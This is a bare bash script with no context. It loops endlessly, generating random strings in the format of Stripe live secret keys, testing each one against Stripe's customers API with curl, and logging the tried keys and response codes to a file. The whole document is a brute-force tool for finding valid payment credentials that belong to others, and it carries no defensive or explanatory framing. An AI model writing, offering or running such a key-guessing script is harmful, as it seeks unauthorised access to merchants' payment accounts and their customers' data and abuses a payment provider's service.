while :
do
 HASH=$(LC_CTYPE=C tr -dc A-Za-z0-9 < /dev/urandom | head -c 24 | xargs)
 KEY="sk_live_$HASH:123"
 HTTP_STATUS=$(curl -u $KEY -w "%{http_code}" -o >(cat >&2) 'https://api.stripe.com/v1/customers' )
 echo "$HTTP_STATUS $KEY" >> out.txt
 echo $HTTP_STATUS
done
